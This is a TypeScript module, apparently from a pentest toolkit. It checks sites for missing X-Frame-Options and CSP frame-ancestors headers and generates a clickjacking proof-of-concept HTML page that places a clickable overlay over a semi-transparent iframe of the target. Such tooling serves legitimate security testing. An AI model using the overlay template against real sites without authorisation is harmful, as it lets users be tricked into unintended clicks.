/**
 * Clickjacking Module
 * Detect and exploit clickjacking vulnerabilities
 */

export interface ClickjackingVulnerability {
  url: string;
  protection: string[];
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
}

export class ClickjackingDetector {
  /**
   * Check for clickjacking protection headers
   */
  async checkProtection(url: string): Promise<ClickjackingVulnerability> {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      const xFrameOptions = response.headers.get('X-Frame-Options');
      const csp = response.headers.get('Content-Security-Policy');
      
      const protections: string[] = [];
      let severity: 'low' | 'medium' | 'high' | 'critical' = 'high';
      
      if (xFrameOptions) {
        protections.push(`X-Frame-Options: ${xFrameOptions}`);
        if (xFrameOptions.toUpperCase() === 'DENY' || xFrameOptions.toUpperCase() === 'SAMEORIGIN') {
          severity = 'low';
        }
      }
      
      if (csp) {
        protections.push(`CSP: ${csp}`);
        if (csp.includes('frame-ancestors')) {
          if (csp.includes("'none'")) {
            severity = 'low';
          } else if (csp.includes("'self'")) {
            severity = 'medium';
          }
        }
      }
      
      if (protections.length === 0) {
        severity = 'critical';
      }
      
      return {
        url,
        protection: protections,
        severity,
        description: protections.length === 0
          ? 'No clickjacking protection detected'
          : `Protection mechanisms: ${protections.join(', ')}`,
      };
    } catch (error) {
      return {
        url,
        protection: [],
        severity: 'high',
        description: `Error checking protection: ${error}`,
      };
    }
  }

  /**
   * Generate clickjacking proof-of-concept
   */
  generatePOC(targetUrl: string, overlayText: string = 'Click here!'): string {
    return `<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            background: rgba(255, 0, 0, 0.5);
            padding: 20px;
            border: 2px solid red;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <iframe src="${targetUrl}"></iframe>
    <div class="overlay">${overlayText}</div>
</body>
</html>`;
  }
}

